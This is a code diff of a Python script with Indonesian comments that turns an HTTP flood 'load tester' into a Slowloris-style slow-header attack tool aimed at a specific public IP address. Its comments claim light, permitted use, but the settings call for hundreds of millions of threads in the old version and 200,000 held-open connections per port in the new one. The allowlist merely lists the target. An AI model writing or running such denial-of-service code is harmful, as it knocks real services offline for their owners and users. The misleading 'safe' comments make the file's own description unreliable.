@@ -1,180 +1,192 @@
 #!/usr/bin/env python3
 """
-HTTP keep-alive load tester (1 koneksi per thread, banyak request berurutan)
-- Paralel via beberapa thread
-- Tiap thread mempertahankan 1 koneksi (keep-alive) dan loop kirim GET
-- Rate per-thread (PER_THREAD_RPS) agar tidak jadi flooder
-- ALLOWLIST untuk IP publik (gunakan hanya pada host yang kamu kuasai/berizin)
+http_slowloris_check.py
+Cek ringan perilaku server terhadap "slow headers" (gaya Slowloris)
+- Koneksi sangat sedikit & berdurasi pendek (aman)
+- Tanpa membanjiri server; hanya observasi timeout/penutupan koneksi
+- Gunakan hanya untuk host milikmu/berizin (ALLOWLIST diterapkan)
 
-Butuh: pip install requests
+Stdlib only: socket, ssl, time, threading
 """
 
-import requests, threading, time, socket, ipaddress, sys
+import socket, ssl, time, threading, random, sys, ipaddress
 from urllib.parse import urlparse
 
-# ===== Konfigurasi =====
-TARGET_URL       = "http://139.99.61.184/~bansosrz7/"  # ganti ke URL situsmu
-THREADS          = 400000000          # banyaknya koneksi paralel (1 koneksi = 1 thread)
-PER_THREAD_RPS   = 5000000         # request per detik per thread (total RPS = THREADS * PER_THREAD_RPS)
-DURATION_SEC     = 1000         # durasi uji
-TIMEOUT_S        = 20        # timeout per request
+# ========= KONFIGURASI =========
+TARGET         = "http://139.99.61.184"  # bisa http://IP atau http(s)://domain
+PATH           = "/"                      # path yang diminta di baris pertama
+PORTS          = [80, 443]                # port yang dicek
+CONNS_PER_PORT = 200000                        # koneksi paralel per port (kecil saja)
+DURATION_SEC   = 300                       # durasi observasi maksimal
+INTERVAL_SEC   = 50                        # jeda antar header "dummy"
+CONNECT_TIMEOUT= 1000000                       # detik
+SOCKET_TIMEOUT = 100                     # detik (read/send timeout)
 
-# ALLOWLIST untuk target publik (berdasar IP hasil DNS)
-ALLOWLIST        = {"139.99.61.184"}
-
-# ===== State & metriks =====
-stop_evt   = threading.Event()
-ok_count   = [0] * THREADS
-err_count  = [0] * THREADS
-bytes_recv = [0] * THREADS
-sec_lats   = []               # latensi-ms untuk window 1 detik (digunakan reporter)
-_hist_bins = [10,20,50,100,200,500,1000,2000,5000,10000, 10**9]  # ms
-_hist_cnts = [0]*len(_hist_bins)
-locks      = [threading.Lock() for _ in range(THREADS)]
-g_lock     = threading.Lock()  # untuk sec_lats & histogram
-
-HEADERS = {
-    "User-Agent": "py-keepalive-loadtester/1.0",
-    "Accept": "*/*",
-    "Connection": "keep-alive",   # penting: minta koneksi dipertahankan
+# ALLOWLIST IP publik
+ALLOWLIST = {
+    "139.99.61.184",
 }
 
-def _p_from_list(v, p):
-    if not v: return None
-    v = sorted(v)
-    k = max(0, min(len(v)-1, int(round((p/100)*(len(v)-1)))))
-    return v[k]
-
-def _hist_add(ms):
-    for i, b in enumerate(_hist_bins):
-        if ms <= b:
-            _hist_cnts[i] += 1
-            break
-
-def _p_from_hist(p):
-    total = sum(_hist_cnts)
-    if total == 0: return None
-    target = p/100.0 * total
-    acc = 0
-    for i, c in enumerate(_hist_cnts):
-        acc += c
-        if acc >= target:
-            return _hist_bins[i]
-    return _hist_bins[-1]
-
-def _resolve_target_ip(url: str) -> str:
-    host = urlparse(url).hostname
-    if not host:
-        print("[STOP] URL tidak valid."); sys.exit(1)
+# ========= UTIL =========
+def is_ip(host: str) -> bool:
     try:
-        return socket.gethostbyname(host)
-    except Exception as e:
-        print(f"[STOP] Gagal resolve host {host}: {e}"); sys.exit(1)
+        ipaddress.ip_address(host); return True
+    except ValueError:
+        return False
 
-def _ensure_allowed(url: str):
-    ip = _resolve_target_ip(url)
+def resolve_host(host: str) -> str:
+    if is_ip(host):
+        return host
+    return socket.gethostbyname(host)
+
+def ensure_allowed(host: str):
+    ip = resolve_host(host)
     ipobj = ipaddress.ip_address(ip)
     is_public = not (ipobj.is_private or ipobj.is_loopback or ipobj.is_link_local)
     if is_public and ip not in ALLOWLIST:
         print(f"[STOP] Target {ip} adalah IP publik dan tidak ada di ALLOWLIST.")
         sys.exit(1)
 
-def worker(idx: int, end_ts: float):
-    # 1 session per thread -> 1 koneksi persist (pool size=1)
-    sess = requests.Session()
-    sess.headers.update(HEADERS)
-    # Pasang adapter dengan pool_maxsize=1 agar thread ini pakai satu koneksi saja
-    from requests.adapters import HTTPAdapter
-    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0, pool_block=True)
-    sess.mount("http://", adapter)
-    sess.mount("https://", adapter)
+# ========= CORE =========
+class ConnResult:
+    def __init__(self, port):
+        self.port = port
+        self.started_at = time.time()
+        self.closed_at = None
+        self.error = None
+        self.sent_lines = 0
 
-    interval = 000.2 / max(1, PER_THREAD_RPS)
-    next_ts = time.time()
-    while not stop_evt.is_set() and time.time() < end_ts:
-        now = time.time()
-        if now < next_ts:
-            time.sleep(min(0.001, next_ts - now))
-            continue
-        t0 = time.perf_counter()
+    @property
+    def duration(self):
+        end = self.closed_at if self.closed_at else time.time()
+        return max(0.0, end - self.started_at)
+
+def make_socket(host: str, port: int):
+    s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
+    s.settimeout(SOCKET_TIMEOUT)
+    return s
+
+def wrap_tls_if_needed(sock, host: str, port: int, scheme: str):
+    if scheme == "https" or port == 443:
+        ctx = ssl.create_default_context()
+        # Non-verifying: kita hanya observasi perilaku, bukan validasi cert
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        server_hostname = host if not is_ip(host) else None
+        sock = ctx.wrap_socket(sock, server_hostname=server_hostname)
+    return sock
+
+def send_slow_headers(host_header: str, sock, res: ConnResult, end_ts: float):
+    # Baris awal + header wajib, TANPA CRLF ganda di akhir
+    first = (
+        f"GET {PATH} HTTP/1.1\r\n"
+        f"Host: {host_header}\r\n"
+        f"User-Agent: slowloris-check/0.1\r\n"
+    ).encode("ascii", "ignore")
+
+    try:
+        sock.sendall(first)
+        res.sent_lines += 3
+    except Exception as e:
+        res.error = f"send first: {e}"
+        return
+
+    # Kirim header dummy kecil tiap INTERVAL_SEC
+    while time.time() < end_ts:
+        line = f"X-Dummy-{random.randint(1000,9999)}: {random.randint(0,999999)}\r\n".encode("ascii", "ignore")
         try:
-            r = sess.get(TARGET_URL, timeout=TIMEOUT_S, allow_redirects=False)
-            body = r.content  # konsumsi respons agar koneksi bisa dipakai ulang
-            dt_ms = (time.perf_counter() - t0) * 1000.0
-            with locks[idx]:
-                if 200 <= r.status_code < 400:
-                    ok_count[idx] += 1
-                else:
-                    err_count[idx] += 1
-                bytes_recv[idx] += len(body)
-            with g_lock:
-                sec_lats.append(dt_ms); _hist_add(dt_ms)
+            sock.sendall(line)
+            res.sent_lines += 1
+            # Coba baca non-blocking sedikit untuk mendeteksi pemutusan sisi server
+            try:
+                sock.settimeout(0.001)
+                if sock.recv(1):
+                    # Kalau server tiba-tiba kirim respons, berarti ia menutup/merespons
+                    pass
+            except socket.timeout:
+                pass
+            finally:
+                sock.settimeout(SOCKET_TIMEOUT)
+        except (BrokenPipeError, ConnectionResetError, ssl.SSLError, OSError) as e:
+            res.closed_at = time.time()
+            res.error = f"closed: {e.__class__.__name__}"
+            return
+        time.sleep(INTERVAL_SEC)
+
+def worker(host: str, port: int, scheme: str, result_list: list, end_ts: float):
+    res = ConnResult(port)
+    result_list.append(res)
+    try:
+        s = make_socket(host, port)
+        s = wrap_tls_if_needed(s, host, port, scheme)
+        send_slow_headers(host, s, res, end_ts)
+    except Exception as e:
+        res.error = f"connect/error: {e}"
+    finally:
+        try:
+            s.close()
         except Exception:
-            dt_ms = (time.perf_counter() - t0) * 1000.0
-            with locks[idx]:
-                err_count[idx] += 1
-            with g_lock:
-                sec_lats.append(dt_ms); _hist_add(dt_ms)
-        finally:
-            next_ts += interval
+            pass
+        if not res.closed_at:
+            # kalau masih terbuka sampai selesai durasi
+            res.closed_at = time.time()
 
-    sess.close()
-
-def reporter(end_ts: float):
-    last = time.perf_counter()
-    prev_bytes = 0
-    while not stop_evt.is_set():
-        now = time.perf_counter()
-        if now - last >= 1.0:
-            last = now
-            total_ok  = sum(ok_count)
-            total_err = sum(err_count)
-            total_b   = sum(bytes_recv)
-            inst_b    = total_b - prev_bytes
-            prev_bytes = total_b
-            with g_lock:
-                p50 = _p_from_list(sec_lats, 50)
-                p95 = _p_from_list(sec_lats, 95)
-                sec_lats.clear()
-            mbps = (inst_b * 8) / 1e6
-            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
-            p50s = f"{p50:.0f}ms" if p50 is not None else "-"
-            p95s = f"{p95:.0f}ms" if p95 is not None else "-"
-            print(f"{ts} | OK={total_ok} ERR={total_err} | IN≈{mbps:7.2f} Mbps | p50={p50s} p95={p95s} | total={total_b/1e6:,.2f} MB")
-        if time.time() >= end_ts:
-            break
-        time.sleep(0.05)
+def summarize(results: list, port: int):
+    kept = [r for r in results if r.port == port and r.error is None and r.duration >= DURATION_SEC - 0.5]
+    early= [r for r in results if r.port == port and (r.error or r.duration < DURATION_SEC - 0.5)]
+    print(f"\n[PORT {port}] connections: {len([r for r in results if r.port==port])}")
+    print(f"  - kept open >= {DURATION_SEC}s : {len(kept)}")
+    if early:
+        med = sorted(r.duration for r in early)[len(early)//2]
+        print(f"  - closed early                : {len(early)} (median close at ~{med:.1f}s)")
+    # Catatan interpretasi
+    if kept:
+        print("  * Interpretasi: server menoleransi header lambat cukup lama.")
+        print("    Periksa/ketatkan: client_header_timeout / read_header_timeout, rate/conn limit per IP.")
+    else:
+        print("  * Interpretasi: server menutup koneksi cepat (mitigasi header timeout tampak aktif).")
 
 def main():
-    print(f"Target : {TARGET_URL}")
-    print(f"Threads: {THREADS} | per-thread RPS: {PER_THREAD_RPS} | Duration: {DURATION_SEC}s | Timeout: {TIMEOUT_S}s")
-    _ensure_allowed(TARGET_URL)
+    u = urlparse(TARGET)
+    scheme = u.scheme or "http"
+    host = u.hostname or u.path  # simple parse untuk 'http://ip'
+    if not host:
+        print("[STOP] TARGET tidak valid."); sys.exit(1)
+
+    ensure_allowed(host)
+    ip = resolve_host(host)
+    print(f"Target: {host} ({ip}) | path={PATH}")
+    print(f"Durasi: {DURATION_SEC}s | interval header: {INTERVAL_SEC}s | conns/port: {CONNS_PER_PORT}")
 
     end_ts = time.time() + DURATION_SEC
-    rep = threading.Thread(target=reporter, args=(end_ts,), daemon=True)
-    rep.start()
-
+    results = []
     threads = []
-    for i in range(THREADS):
-        t = threading.Thread(target=worker, args=(i, end_ts), daemon=True)
-        t.start()
-        threads.append(t)
+
+    for port in PORTS:
+        for _ in range(CONNS_PER_PORT):
+            t = threading.Thread(target=worker, args=(host, port, scheme, results, end_ts), daemon=True)
+            t.start()
+            threads.append(t)
 
     try:
         while time.time() < end_ts:
             time.sleep(0.2)
     except KeyboardInterrupt:
         print("\n[INFO] Dihentikan oleh user.")
-    finally:
-        stop_evt.set()
-        for t in threads: t.join(timeout=1.0)
 
-    total_ok  = sum(ok_count)
-    total_err = sum(err_count)
-    total_b   = sum(bytes_recv)
-    p50_all   = _p_from_hist(50) or 0
-    p95_all   = _p_from_hist(95) or 0
-    print(f"\nSelesai. OK={total_ok} ERR={total_err} | Total={total_b/1e6:.2f} MB | p50≈{p50_all:.0f}ms p95≈{p95_all:.0f}ms")
+    # join sebentar
+    for t in threads:
+        t.join(timeout=1.0)
+
+    # Ringkasan per port
+    for p in PORTS:
+        summarize(results, p)
+
+    # Detail ringan
+    print("\nDetail koneksi:")
+    for r in results:
+        status = "kept_to_end" if (r.error is None and r.duration >= DURATION_SEC - 0.5) else (r.error or "closed")
+        print(f"  - port {r.port}: duration={r.duration:.1f}s, sent_lines={r.sent_lines}, status={status}")
 
 if __name__ == "__main__":
     main()
